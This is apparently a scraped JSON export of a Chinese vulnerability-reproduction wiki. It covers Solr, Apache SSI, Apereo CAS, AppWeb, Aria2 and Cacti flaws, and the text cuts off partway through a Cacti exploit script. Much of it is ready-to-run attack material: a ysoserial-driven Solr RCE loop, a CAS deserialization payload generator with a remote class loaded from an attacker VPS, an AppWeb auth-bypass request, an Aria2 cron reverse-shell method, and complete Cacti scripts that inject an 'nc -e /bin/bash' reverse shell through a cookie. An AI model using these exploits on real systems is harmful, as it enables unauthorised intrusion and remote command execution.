print(\"KO\") os.killpg(os.getpgid(pro.pid), signal.SIGTERM) sys.exit() os.killpg(os.getpgid(pro.pid), signal.SIGTERM) time.sleep(3) pro = subprocess.Popen( \"java -cp ysoserial-master-ff59523eb6-1.jar ysoserial.exploit.JRMPListener \" + RPORT + \" Jdk7u21 'sed -i 1cpwn /tmp/passwd'\", stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid) print(\"[+] Preparing file =>\", end=' ') burp0_url = remote + ressource burp0_headers = {\"Content-Type\": \"application/json\"} burp0_json = { \"set-property\": {\"jmx.serviceUrl\": \"service:jmx:rmi:///jndi/rmi://\" + RHOST + \":\" + RPORT + \"/obj\"}} r = requests.post( burp0_url, headers=burp0_headers, json=burp0_json) if r.status_code == 500: print(\"\\033[92mOK\\033[0m\") else: print(\"KO\") os.killpg(os.getpgid(pro.pid), signal.SIGTERM) sys.exit() os.killpg(os.getpgid(pro.pid), signal.SIGTERM) time.sleep(3) pro = subprocess.Popen( \"java -cp ysoserial-master-ff59523eb6-1.jar ysoserial.exploit.JRMPListener \" + RPORT + \" Jdk7u21 'sed -i /[^pwn]/d /tmp/passwd'\", stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid) print(\"[+] Cleaning temp file =>\", end=' ') burp0_url = remote + ressource burp0_headers = {\"Content-Type\": \"application/json\"} burp0_json = { \"set-property\": {\"jmx.serviceUrl\": \"service:jmx:rmi:///jndi/rmi://\" + RHOST + \":\" + RPORT + \"/obj\"}} r = requests.post( burp0_url, headers=burp0_headers, json=burp0_json) if r.status_code == 500: print(\"\\033[92mOK\\033[0m\") else: print(\"KO\") os.killpg(os.getpgid(pro.pid), signal.SIGTERM) sys.exit() os.killpg(os.getpgid(pro.pid), signal.SIGTERM) time.sleep(3) pro = subprocess.Popen( \"java -cp ysoserial-master-ff59523eb6-1.jar ysoserial.exploit.JRMPListener \" + RPORT + \" Jdk7u21 'sed -i 1s/pwn/{echo,\" + command_str + \"}|{base64,-d}>pwn.txt/g /tmp/passwd'\", stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid) print(\"[+] Writing command into temp file =>\", end=' ') burp0_url = remote + ressource burp0_headers = {\"Content-Type\": \"application/json\"} burp0_json = { \"set-property\": {\"jmx.serviceUrl\": \"service:jmx:rmi:///jndi/rmi://\" + RHOST + \":\" + RPORT + \"/obj\"}} r = requests.post( burp0_url, headers=burp0_headers, json=burp0_json) if r.status_code == 500: print(\"\\033[92mOK\\033[0m\") else: print(\"KO\") os.killpg(os.getpgid(pro.pid), signal.SIGTERM) sys.exit() os.killpg(os.getpgid(pro.pid), signal.SIGTERM) time.sleep(3) pro = subprocess.Popen( \"java -cp ysoserial-master-ff59523eb6-1.jar ysoserial.exploit.JRMPListener \" + RPORT + \" Jdk7u21 'bash /tmp/passwd'\", stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid) print(\"[+] Decode base64 command =>\", end=' ') burp0_url = remote + ressource burp0_headers = {\"Content-Type\": \"application/json\"} burp0_json = { \"set-property\": {\"jmx.serviceUrl\": \"service:jmx:rmi:///jndi/rmi://\" + RHOST + \":\" + RPORT + \"/obj\"}} r = requests.post( burp0_url, headers=burp0_headers, json=burp0_json) if r.status_code == 500: print(\"\\033[92mOK\\033[0m\") else: print(\"KO\") os.killpg(os.getpgid(pro.pid), signal.SIGTERM) sys.exit() os.killpg(os.getpgid(pro.pid), signal.SIGTERM) time.sleep(3) pro = subprocess.Popen( \"java -cp ysoserial-master-ff59523eb6-1.jar ysoserial.exploit.JRMPListener \" + RPORT + \" Jdk7u21 'bash pwn.txt'\", stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid) print(\"[+] Executing command =>\", end=' ') burp0_url = remote + ressource burp0_headers = {\"Content-Type\": \"application/json\"} burp0_json = { \"set-property\": {\"jmx.serviceUrl\": \"service:jmx:rmi:///jndi/rmi://\" + RHOST + \":\" + RPORT + \"/obj\"}} r = requests.post( burp0_url, headers=burp0_headers, json=burp0_json) if r.status_code == 500: print(\"\\033[92mOK\\033[0m\") else: print(\"KO\") os.killpg(os.getpgid(pro.pid), signal.SIGTERM) sys.exit() os.killpg(os.getpgid(pro.pid), signal.SIGTERM) time.sleep(3) except KeyboardInterrupt: print(\"Exiting...\") break 参考链接 https://github.com/mpgn/CVE-2019-0192 https://mp.weixin.qq.com/s?__biz=MzI4NjE2NjgxMQ==&mid=2650237094&idx=1&sn=4125bf632680d991f38f9f147657b38d&chksm=f3e2d2d2c4955bc4894b3098ca11cbe7d9917c23e173c87b7fe2f02c84b195aea381746567a3&scene=21#wechat_redirect 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-16 20:25:15 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Apache SSI/Apache SSI 远程命令执行漏洞.html":{"url":"0day/Apache SSI/Apache SSI 远程命令执行漏洞.html","title":"Apache SSI 远程命令执行漏洞","keywords":"","body":"Apache SSI 远程命令执行漏洞 一、漏洞简介 在测试任意文件上传漏洞的时候，目标服务端可能不允许上传php后缀的文件。如果目标服务器开启了SSI与CGI支持，我们可以上传一个shtml文件，并利用``语法执行任意命令。 二、漏洞影响 三、复现过程 正常上传PHP文件是不允许的，我们可以上传一个shell.shtml文件： 成功上传，然后访问shell.shtml，可见命令已成功执行： 参考链接 https://vulhub.org/#/environments/httpd/ssi-rce/ 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-25 15:26:22 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Apereo CAS/Apereo CAS 4.X execution参数反序列化漏洞.html":{"url":"0day/Apereo CAS/Apereo CAS 4.X execution参数反序列化漏洞.html","title":"Apereo CAS 4.X execution参数反序列化漏洞","keywords":"","body":"Apereo CAS 4.X execution参数反序列化漏洞 一、漏洞简介 该攻击媒介特别适用于CAS的所有部署v4.1.x和v4.2.x地方中科院外的开箱默认配置用于管理对象序列化，数据加密和签名部署 二、漏洞影响 Apereo CAS 4.1.x - 4.16 Apereo CAS 4.1.7 - 4.2x 三、复现过程 在 cas-servlet.xml 中，可以知道对execution参数应该关注 FlowExecutorImpl 在 org/springframework/webflow/executor/FlowExecutorImpl.class:96 public FlowExecutionResult resumeExecution(String flowExecutionKey, ExternalContext context) throws FlowException { FlowExecutionResult var6; try { ... try { FlowExecution flowExecution = this.executionRepository.getFlowExecution(key); ... } ... } ... } 跟进 getFlowExecution，在 spring-webflow-client-repo-1.0.0.jar!/org/jasig/spring/webflow/plugin/ClientFlowExecutionRepository.class:51 public FlowExecution getFlowExecution(FlowExecutionKey key) throws FlowExecutionRepositoryException { ... byte[] encoded = ((ClientFlowExecutionKey)key).getData(); try { ClientFlowExecutionRepository.SerializedFlowExecutionState state = (ClientFlowExecutionRepository.SerializedFlowExecutionState)this.transcoder.decode(encoded); ... } } 跟进 decode spring-webflow-client-repo-1.0.0.jar!/org/jasig/spring/webflow/plugin/EncryptedTranscoder.class:80 public Object decode(byte[] encoded) throws IOException { byte[] data; try { data = this.cipherBean.decrypt(encoded); } catch (Exception var11) { throw new IOException(\"Decryption error\", var11); } ByteArrayInputStream inBuffer = new ByteArrayInputStream(data); ObjectInputStream in = null; Object var5; try { if (this.compression) { in = new ObjectInputStream(new GZIPInputStream(inBuffer)); } else { in = new ObjectInputStream(inBuffer); } var5 = in.readObject(); } catch (ClassNotFoundException var10) { throw new IOException(\"Deserialization error\", var10); } finally { if (in != null) { in.close(); } } return var5; } post进入的execution参数值即encoded，在经过decrypt解密后，最终在var5 = in.readObject()触发反序列化漏洞。 Apereo CAS 4.1.X ~ 4.1.6 漏洞复现 4.1.x 的加密过程直接利用了EncryptedTranscoder中的encode public class EncryptedTranscoder implements Transcoder { private CipherBean cipherBean; private boolean compression = true; public EncryptedTranscoder() throws IOException { BufferedBlockCipherBean bufferedBlockCipherBean = new BufferedBlockCipherBean(); bufferedBlockCipherBean.setBlockCipherSpec(new BufferedBlockCipherSpec(\"AES\", \"CBC\", \"PKCS7\")); bufferedBlockCipherBean.setKeyStore(this.createAndPrepareKeyStore()); bufferedBlockCipherBean.setKeyAlias(\"aes128\"); bufferedBlockCipherBean.setKeyPassword(\"changeit\"); bufferedBlockCipherBean.setNonce(new RBGNonce()); this.setCipherBean(bufferedBlockCipherBean); } ... public byte[] encode(Object o) throws IOException { if (o == null) { return new byte[0]; } else { ByteArrayOutputStream outBuffer = new ByteArrayOutputStream(); ObjectOutputStream out = null; try { if (this.compression) { out = new ObjectOutputStream(new GZIPOutputStream(outBuffer)); } else { out = new ObjectOutputStream(outBuffer); } out.writeObject(o); } finally { if (out != null) { out.close(); } } try { return this.cipherBean.encrypt(outBuffer.toByteArray()); } catch (Exception var7) { throw new IOException(\"Encryption error\", var7); } } } ... protected KeyStore createAndPrepareKeyStore() { KeyStoreFactoryBean ksFactory = new KeyStoreFactoryBean(); URL u = this.getClass().getResource(\"/etc/keystore.jceks\"); ksFactory.setResource(new URLResource(u)); ksFactory.setType(\"JCEKS\"); ksFactory.setPassword(\"changeit\"); return ksFactory.newInstance(); } } 同时要注意存在一个base64的过程 因此要生成payload，即先用encode加密后再进行一次base64编码。其中/etc/keystore.jceks在spring-webflow-client-repo-1.0.0.jar/etc/目录下 生成payload import org.cryptacular.util.CodecUtil; import org.jasig.spring.webflow.plugin.EncryptedTranscoder; import ysoserial.payloads.ObjectPayload; public class ApereoExploit { public static void main(String[] args) throws Exception{ String poc[] = {\"CommonsCollections2\",\"bash-shell\"}; final Object payloadObject = ObjectPayload.Utils.makePayloadObject(poc[0], poc[1]); //AES加密 EncryptedTranscoder et = new EncryptedTranscoder(); byte[] encode = et.encode(payloadObject); //base64编码 System.out.println(CodecUtil.b64(encode)); } } 运行代码 接着 服务器监听： 完整过程动图 Apereo CAS 4.1.7 ～ 4.2.X 漏洞复现 以4.2.7为例。 利用 4.2.x 的decrypt函数在 cas-server-webapp-support-4.2.7.jar!/org/jasig/cas/web/flow/CasWebflowCipherBean.class:34 public byte[] decrypt(byte[] bytes) { return (byte[])this.webflowCipherExecutor.decode(bytes); } 其中decode在 cas-server-core-util.jar!/jasig/cas/util/BinaryCipherExecutor.java:82 @Override public byte[] encode(final byte[] value) { try { final Key key = new SecretKeySpec(this.encryptionSecretKey.getBytes(), this.secretKeyAlgorithm); final CipherService cipher = new AesCipherService(); final byte[] result = cipher.encrypt(value, key.getEncoded()).getBytes(); return sign(result); } catch (final Exception e) { logger.error(e.getMessage(), e); throw new RuntimeException(e); } } @Override public byte[] decode(final byte[] value) { try { final byte[] verifiedValue = verifySignature(value); final Key key = new SecretKeySpec(this.encryptionSecretKey.getBytes(UTF8_ENCODING), this.secretKeyAlgorithm); final CipherService cipher = new AesCipherService(); final byte[] result = cipher.decrypt(verifiedValue, key.getEncoded()).getBytes(); return result; } catch (final Exception e) { logger.error(e.getMessage(), e); throw new RuntimeException(e); } } 而上面encode其对应的调用加密流程在 cas-server-core-util.jar!/org/jasig/cas/util/WebflowCipherExecutor.java:14 @Component(\"webflowCipherExecutor\") public class WebflowCipherExecutor extends BinaryCipherExecutor { /** * Instantiates a new webflow cipher executor. * * @param secretKeyEncryption the secret key encryption * @param secretKeySigning the secret key signing * @param secretKeyAlg the secret key alg */ @Autowired public WebflowCipherExecutor(@Value(\"${webflow.encryption.key:}\") final String secretKeyEncryption, @Value(\"${webflow.signing.key:}\") final String secretKeySigning, @Value(\"${webflow.secretkey.alg:AES}\") final String secretKeyAlg){ super(secretKeyEncryption, secretKeySigning); setSecretKeyAlgorithm(secretKeyAlg); } } 因此其加密过程与 4.1.X稍微有些不同，需要重新写加密逻辑。 复现 利用 cas-overlay-template-4.2 ，其中在cas-overlay-template-4.2\\cas-overlay-template-4.2\\src\\main\\webapp\\WEB-INF\\spring-configuration\\propertyFileConfigurer.xml 指定了cas.properties 的位置，最终生成war包，放于Tomcat webapps目录下。 修改cas.properties，使其支持http，并修改webflow相关默认密钥 webflow.encryption.key=C4SBogp_badO82wC webflow.signing.key=8_G6JMTdkxiJ5rN0tqFrEOQj200VoxGrRzAp7bvjMFSGdA2IOzdFRsGv3m3GMNVmoSJ0O4miIBrYCHx_FWP4oQ 利用 apereocas42.jar 生成加密参数，由于依赖包中存在c3p0 因此可以利用其做gadget java -jar apereocas42.jar C4SBogp_badO82wC 8_G6JMTdkxiJ5rN0tqFrEOQj200VoxGrRzAp7bvjMFSGdA2IOzdFRsGv3m3GMNVmoSJ0O4miIBrYCHx_FWP4oQ C3P0 http://your_vps:60006/:Exploit execution=7995ec15-cec8-4eed-9d31-d9a1f7a7138b_ZXlKaGJHY2lPaUpJVXpVeE1pSjkuTVM5aVdUaEtiSE4zVW1KYVZqUXJielZoZFV4V1FWZExUVGRPVUdsblZYVk9hbkZaTUVwdWNUbE1hekpMTVUxeGQyaHVhRkJwY3pacVluZ3ZWVTVNTDBKdVFsUnpkMUIxYW5kVlZUWjRVMDloUlN0SGVUVjZjbXRGYkU5Rk5tNXNUa3R5UVdNMVUwRXpkSFpYYWs4NVpuRjFWUzg0YVZWcmFVaDRUeXRIV1ZFMU5GVXZZV0pSVDJGSmQwaGxkSFZNWlc5VFRsRTNNbE5WSzBjMVFXazFiV2h2V2tWMFVtZEVaVE0zZVhSeldsbDVLMjQwUzJSM1YzSllhemxLV0dRclRuWk5lSE4xZURKM2NIazJRMHBXYkVOS01UVnZURlZEU2tKMU5rMVRaVll3ZVV4VmFHWlBkVzlUZFhCYVpYaFFiV1pwY1hSV1YzVnhMMUIxV0dSWFYxaFhRVGt6ZUZKSGVGcDNTSFZYTkUxRVpVRjFLM1pDU1hWWFQzZG1我是马赛克pT1ZKSVZHNXVUMlpCVFdWdGFGSmFTV0pyWjJWTGJsUnFXVXhVYTA5UUx6QnVLM2xTZVdoQ1NGaDBja3d3VFVab056UTFValJ2VFUwNGNpODRPRXhFVjFKR2VHdEtaSGxNWjFScVdVRnRkMHRIUW00dk5HOHZiR0p0WjBSeVVHdElUbWhIVm1ORVoxSkdlRzlQYm5vMmFXaHVkWEpPVEdaa1kzWXlVMHB3Vm1GSFEwTkZXR3cwZW1Jd1dVSkhjRTlCVUVwUldXZ3ZNRmxaTkVGb09FMXlNRlpGY2t4NFlXUnhTR2QzYmxwSVRVUjFNM2hMT1VOQ2NGRnRWWEo0T1RKRE1ETm1NbmhDTVdwdGRUSktkR3Q1WVc1WmJsZFdVMjlKUm1jMWVERlpXbGg1V1hWclRHZGpXa1Y1VVVOSk5sQlVjM2xXYlc1NlJHUlphbHBMZWpVemRXeHpUVEZtVjNkR1lrOVRRelYwWkROWE9XVkJTM2hPVm5CUE9VOVFRbEJzWVZJd2J5OXFkV1ZrYjNnMmRGZDVWRFEwUlZsVVlXZ3pPVXcwT0ZrclFXNDFlRGcxYUdwNVlXeHVNV3BYVEVSc2MzSnNVRU5MU0ZoV2NYb3JNMmM5UFEuUHlVb1FOdWNYS01Ra1lJZllZQ1FJaXUwQTROUkdzaExCOGMxMHczYzRWRDhHVmI1ZjRMbjZXQllmVUtKVU5FREpwZjl0ckd6N0pQTHJVLXlpMWRSRkE= 在自己的vps上编译Exploit.java，生成Exploit.class public class Exploit { public Exploit(){ try { java.lang.Runtime.getRuntime().exec( new String[]{\"cmd.exe\",\"/C\",\"calc.exe\"} ); } catch(Exception e){ e.printStackTrace(); } } public static void main(String[] argv){ Exploit e = new Exploit(); } } // javac Exploit.java 生成Exploit.class // python3 -m http.server 60006 截取cas的登录包，替换execution参数 vps上可以看到c3p0远程加载了class 参考链接 https://app.yinxiang.com/fx/83617723-790c-4a9e-b884-f6831e2acf78 https://xz.aliyun.com/t/7032#toc-1 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-22 00:29:37 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/AppWeb/CVE-2018-8715.html":{"url":"0day/AppWeb/CVE-2018-8715.html","title":"（CVE-2018-8715）AppWeb认证绕过漏洞","keywords":"","body":"（CVE-2018-8715）AppWeb认证绕过漏洞 一、漏洞简介 AppWeb是Embedthis Software LLC公司负责开发维护的一个基于GPL开源协议的嵌入式Web Server。他使用C/C++来编写，能够运行在几乎先进所有流行的操作系统上。当然他最主要的应用场景还是为嵌入式设备提供Web Application容器。 AppWeb可以进行认证配置，其认证方式包括以下三种： basic 传统HTTP基础认证 digest 改进版HTTP基础认证，认证成功后将使用Cookie来保存状态，而不用再传递Authorization头 form 表单认证 其7.0.3之前的版本中，对于digest和form两种认证方式，如果用户传入的密码为null（也就是没有传递密码参数），appweb将因为一个逻辑错误导致直接认证成功，并返回session。 二、漏洞影响 AppWeb 三、复现过程 利用该漏洞需要知道一个已存在的用户名，当前环境下用户名为admin。 构造头Authorization: Digest username=admin，并发送如下数据包： GET / HTTP/1.1 Host: example.com Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Authorization: Digest username=admin 可见，因为我们没有传入密码字段，所以服务端出现错误，直接返回了200，且包含一个session： 设置这个session到浏览器，即可正常访问需要认证的页面： 参考链接 https://vulhub.org/#/environments/appweb/CVE-2018-8715/ 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-24 21:24:15 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Aria2/CVE-2016-3088.html":{"url":"0day/Aria2/CVE-2016-3088.html","title":"（CVE-2016-3088）Aria2 任意文件写入漏洞","keywords":"","body":"（CVE-2016-3088）Aria2 任意文件写入漏洞 一、漏洞简介 Aria2是一个命令行下轻量级、多协议、多来源的下载工具（支持 HTTP/HTTPS、FTP、BitTorrent、Metalink），内建XML-RPC和JSON-RPC接口。在有权限的情况下，我们可以使用RPC接口来操作aria2来下载文件，将文件下载至任意目录，造成一个任意文件写入漏洞。 二、漏洞影响 Aria2 三、复现过程 因为rpc通信需要使用json或者xml，不太方便，所以我们可以借助第三方UI来和目标通信，如 http://binux.github.io/yaaw/demo/ 。 https://github.com/ianxtianxt/yaaw 源码在这里，也可自行搭建。 打开yaaw，点击配置按钮，填入运行aria2的目标域名：http://your-ip:6800/jsonrpc: 然后点击Add，增加一个新的下载任务。在Dir的位置填写下载至的目录，File Name处填写文件名。比如，我们通过写入一个crond任务来反弹shell： 这时候，arai2会将恶意文件（我指定的URL）下载到/etc/cron.d/目录下，文件名为shell。而在debian中，/etc/cron.d目录下的所有文件将被作为计划任务配置文件（类似crontab）读取，等待一分钟不到即成功反弹shell： 如果反弹不成功，注意crontab文件的格式，以及换行符必须是\\n，且文件结尾需要有一个换行符。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-25 15:43:43 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Cacti/CVE-2020-8813.html":{"url":"0day/Cacti/CVE-2020-8813.html","title":"（CVE-2020-8813）Cacti v1.2.8 远程命令执行漏洞","keywords":"","body":"（CVE-2020-8813）Cacti v1.2.8 远程命令执行漏洞 一、漏洞简介 需要拥有登录账号密码；或者网站启用了“ Gest Realtime Graphs”特权功能。 1、判断是否存在“/graph_realtime.php?action=init”链接 2、判断1、存在“poller_realtime.php”字样，则存在漏洞。 二、漏洞影响 Cacti v1.2.8 三、复现过程 漏洞分析 我通过分析Cacti主要代码中的多个功能的代码发现了此漏洞，我必须将多个因素联系在一起才能执行代码，该漏洞主要发生在攻击者尝试将恶意代码注入“ Cacti” cookie变量时，在与一些字符串连接后被传递给shell_exec函数，但是当我尝试操作cookie值时会遇到身份验证问题，这将使我无法访问该页面，因此解决了我注意到可以按以下方式访问易受攻击的页面：一个不需要进行身份验证即可访问的“来宾”，因此我链接了我的漏洞利用程序，以启用“ graph_realtime.php”页面的“来宾”视图，然后发出恶意请求，以便在主机上执行代码。 为了完成这项工作，首先，我需要向“ user_admin.php”页面发送请求以启用realtime_graph的“来宾”特权，然后再次将恶意请求发送至“ graph_realtime.php”页面。 因此，我像往常一样从超级简单的RCE扫描器脚本开始，以在Cacti中寻找RCE。 运行脚本后，在“ graph_realtime.php”文件中得到了一个有趣的结果： graph_realtime.php /* call poller */ $graph_rrd = read_config_option('realtime_cache_path') . '/user_' . session_id() . '_lgi_' . get_request_var('local_graph_id') . '.png'; $command = read_config_option('path_php_binary'); $args = sprintf('poller_realtime.php --graph=%s --interval=%d --poller_id=' . session_id(), get_request_var('local_graph_id'), $graph_data_array['ds_step']); shell_exec(\"$command $args\"); /* construct the image name */ $graph_data_array['export_realtime'] = $graph_rrd; $graph_data_array['output_flag'] = RRDTOOL_OUTPUT_GRAPH_DATA; $null_param = array(); 从行号170和171中可以看到，我们正在接收几个参数并将它们连接在一起，我们还可以看到有一个名为“ get_request_var”的函数，该函数执行以下操作： html_utility.php function get_request_var($name, $default = '') { global $_CACTI_REQUEST; $log_validation = read_config_option('log_validation'); if (isset($_CACTI_REQUEST[$name])) { return $_CACTI_REQUEST[$name]; } elseif (isset_request_var($name)) { if ($log_validation == 'on') { html_log_input_error($name); } set_request_var($name, $_REQUEST[$name]); return $_REQUEST[$name]; } else { return $default; } } 正如我们所看到的，该函数将通过“ set_request_var”函数处理输入并设置参数值，该函数将执行以下操作： html_utility.php function set_request_var($variable, $value) { global $_CACTI_REQUEST; $_CACTI_REQUEST[$variable] = $value; $_REQUEST[$variable] = $value; $_POST[$variable] = $value; $_GET[$variable] = $value; } 因此，回到我们的“ graph_realtime.php”，我们可以看到我们可以控制以下几个输入： local_graph_id $ graph_data_array ['ds_step']的值 但不幸的是，由于以下几个原因，我们不能这样做：首先，我们注意到graph_realtime.php文件中的第171行使用sprintf来处理输入，并且我们可以看到第一个值“ graph”充满了我们可以控制的值“ local_graph_id”！但是再次不幸的是，该值将被名为“ get_filter_request_var”的函数过滤，我们可以看到它的值已在graph_realtime.php第38行中过滤，如下所示： html_utility.php function get_filter_request_var($name, $filter = FILTER_VALIDATE_INT, $options = array()) { if (isset_request_var($name)) { if (isempty_request_var($name)) { set_request_var($name, get_nfilter_request_var($name)); return get_request_var($name); } elseif (get_nfilter_request_var($name) == 'undefined') { if (isset($options['default'])) { set_request_var($name, $options['default']); return $options['default']; } else { set_request_var($name, ''); return ''; } } else { if (get_nfilter_request_var($name) == '0') { $value = '0'; } elseif (get_nfilter_request_var($name) == 'undefined') { if (isset($options['default'])) { $value = $options['default']; } else { $value = ''; } } elseif (isempty_request_var($name)) { $value = ''; } elseif ($filter == FILTER_VALIDATE_IS_REGEX) { if (is_base64_encoded($_REQUEST[$name])) { $_REQUEST[$name] = utf8_decode(base64_decode($_REQUEST[$name])); } $valid = validate_is_regex($_REQUEST[$name]); if ($valid === true) { $value = $_REQUEST[$name]; } else { $value = false; $custom_error = $valid; } } elseif ($filter == FILTER_VALIDATE_IS_NUMERIC_ARRAY) { $valid = true; if (is_array($_REQUEST[$name])) { foreach($_REQUEST[$name] AS $number) { if (!is_numeric($number)) { $valid = false; break; } } } else { $valid = false; } if ($valid == true) { $value = $_REQUEST[$name]; } else { $value = false; } } elseif ($filter == FILTER_VALIDATE_IS_NUMERIC_LIST) { $valid = true; $values = preg_split('/,/', $_REQUEST[$name], NULL, PREG_SPLIT_NO_EMPTY); foreach($values AS $number) { if (!is_numeric($number)) { $valid = false; break; } } if ($valid == true) { $value = $_REQUEST[$name]; } else { $value = false; } } elseif (!cacti_sizeof($options)) { $value = filter_var($_REQUEST[$name], $filter); } else { $value = filter_var($_REQUEST[$name], $filter, $options); } } if ($value === false) { if ($filter == FILTER_VALIDATE_IS_REGEX) { $_SESSION['custom_error'] = __('The search term \"%s\" is not valid. Error is %s', html_escape(get_nfilter_request_var($name)), html_escape($custom_error)); set_request_var($name, ''); raise_message('custom_error'); } else { die_html_input_error($name, get_nfilter_request_var($name)); } } else { set_request_var($name, $value); return $value; } } else { if (isset($options['default'])) { set_request_var($name, $options['default']); return $options['default']; } else { return; } } } 该函数将过滤输入并返回一个干净的变量以传递给该函数。 另外，对于第二个变量“ $ graph_data_array ['ds_step']”，它已经通过sprintf处理为％d，表示“十进制值”，因此我们不能使用它来注入恶意命令。 那么我们怎样才能使这件事起作用呢？让我们再次看一下代码： graph_realtime.php /* call poller */ $graph_rrd = read_config_option('realtime_cache_path') . '/user_' . session_id() . '_lgi_' . get_request_var('local_graph_id') . '.png'; $command = read_config_option('path_php_binary'); $args = sprintf('poller_realtime.php --graph=%s --interval=%d --poller_id=' . session_id(), get_request_var('local_graph_id'), $graph_data_array['ds_step']); shell_exec(\"$command $args\"); /* construct the image name */ $graph_data_array['export_realtime'] = $graph_rrd; $graph_data_array['output_flag'] = RRDTOOL_OUTPUT_GRAPH_DATA; $null_param = array(); 我们得到另一个传递给shell_exec的变量，它是“ session_id（）”函数的值，该函数将返回用户当前会话的值，这意味着我们可以使用它来注入命令！ 可是等等！如果我们操纵了会话，则将无法访问该页面，因为该页面要求对用户进行身份验证才能访问该页面。因此，在软件中进行了一些额外的挖掘之后，我发现如果我们能够以访客身份访问该页面启用了一种称为“实时图”的特殊特权，我们可以从此页面看到： 让我们尝试在没有启用“访客实时图”特权的情况下访问此页面： 如我们所见，由于权限问题，我们无法访问该页面，不允许尝试启用它并访问该页面以获取以下内容： 完美的是，我们访问了页面，现在我将向“ graph_realtime.php”发送请求，并添加一条调试语句，该语句将回显将传递给shell_exec的参数： 如我们所见，我们将会话打印输出给我们，因此让我们尝试将自定义字符串注入会话中，看看会发生什么： payload编写 在控制了会话值之后，我们需要使用它来在系统上执行代码，但这仍然是一个会话值，这意味着即使对它进行编码也不能在其中使用某些字符，因此我们需要编写“会话友好” ”，我们可以注入这些有效负载而无需强制应用程序为我们生成另一个Cookie值。 例如，如果我对字符串“ Hi Payload”进行编码并将其传递给应用程序，我将得到以下信息： 如我们所见，该应用程序为我们设置了一个cookie而不是我们注入的cookie，因此要解决此问题，我们需要使用自定义有效负载。 因此，为了避免使用空格，我想到了使用“ $ {IFS}” bash变量来表示空格的想法。 当然，我们需要使用“;”转义命令 如下所示： ;payload 如果要使用netcat获得外壳，则需要创建以下有效负载： ;``nc``${IFS}-e${IFS}``/bin/bash``${IFS}ip${IFS}port 让我们尝试一下，首先对有效负载进行编码，以查看结果： 然后将其发送到应用程序以获取以下信息： 完整版的poc 为了自动化利用过程，我编写了一个python代码来利用此漏洞，利用此漏洞将处理登录过程以启用“来宾实时图”特权，然后将生成有效负载并将精心制作的请求发送到“ graph_realtime.php”页面为了获得反向壳。 这是完整的利用代码： #!/usr/bin/python3 # Exploit Title: Cacti v1.2.8 Remote Code Execution # Date: 03/02/2020 # Exploit Author: Askar (@mohammadaskar2) # CVE: CVE-2020-8813 # Vendor Homepage: https://cacti.net/ # Version: v1.2.8 # Tested on: CentOS 7.3 / PHP 7.1.33 import requests import sys import warnings from bs4 import BeautifulSoup from urllib.parse import quote warnings.filterwarnings(\"ignore\", category=UserWarning, module='bs4') if len(sys.argv) != 6: print(\"[~] Usage : ./Cacti-exploit.py url username password ip port\") exit() url = sys.argv[1] username = sys.argv[2] password = sys.argv[3] ip = sys.argv[4] port = sys.argv[5] def login(token): login_info = { \"login_username\": username, \"login_password\": password, \"action\": \"login\", \"__csrf_magic\": token } login_request = request.post(url+\"/index.php\", login_info) login_text = login_request.text if \"Invalid User Name/Password Please Retype\" in login_text: return False else: return True def enable_guest(token): request_info = { \"id\": \"3\", \"section25\": \"on\", \"section7\": \"on\", \"tab\": \"realms\", \"save_component_realm_perms\": 1, \"action\": \"save\", \"__csrf_magic\": token } enable_request = request.post(url+\"/user_admin.php?header=false\", request_info) if enable_request: return True else: return False def send_exploit(): payload = \";nc${IFS}-e${IFS}/bin/bash${IFS}%s${IFS}%s\" % (ip, port) cookies = {'Cacti': quote(payload)} requests.get(url+\"/graph_realtime.php?action=init\", cookies=cookies) request = requests.session() print(\"[+]Retrieving login CSRF token\") page = request.get(url+\"/index.php\") html_content = page.text soup = BeautifulSoup(html_content, \"html5lib\") token = soup.findAll('input')[0].get(\"value\") if token: print(\"[+]Token Found : %s\" % token) print(\"[+]Sending creds ..\") login_status = login(token) if login_status: print(\"[+]Successfully LoggedIn\") print(\"[+]Retrieving CSRF token ..\") page = request.get(url+\"/user_admin.php?action=user_edit&id=3&tab=realms\") html_content = page.text soup = BeautifulSoup(html_content, \"html5lib\") token = soup.findAll('input')[1].get(\"value\") if token: print(\"[+]Making some noise ..\") guest_realtime = enable_guest(token) if guest_realtime: print(\"[+]Sending malicous request, check your nc ;)\") send_exploit() else: print(\"[-]Error while activating the malicous account\") else: print(\"[-] Unable to retrieve CSRF token from admin page!\") exit() else: print(\"[-]Cannot Login!\") else: print(\"[-] Unable to retrieve CSRF token!\") exit() 运行漏洞利用代码后，我们将获得以下内容： 未经身份验证的利用 如果Cacti启用了“来宾实时图”特权，则无需身份验证即可利用此漏洞，因此在这种情况下，不需要身份验证部分，您可以使用以下代码来利用此漏洞： #!/usr/bin/python3 # Exploit Title: Cacti v1.2.8 Unauthenticated Remote Code Execution # Date: 03/02/2020 # Exploit Author: Askar (@mohammadaskar2) # CVE: CVE-2020-8813 # Vendor Homepage: https://cacti.net/ # Version: v1.2.8 # Tested on: CentOS 7.3 / PHP 7.1.33 import requests import sys import warnings from bs4 import BeautifulSoup from urllib.parse import quote warnings.filterwarnings(\"ignore\", category=UserWarning, module='bs4') if len(sys.argv) != 4: 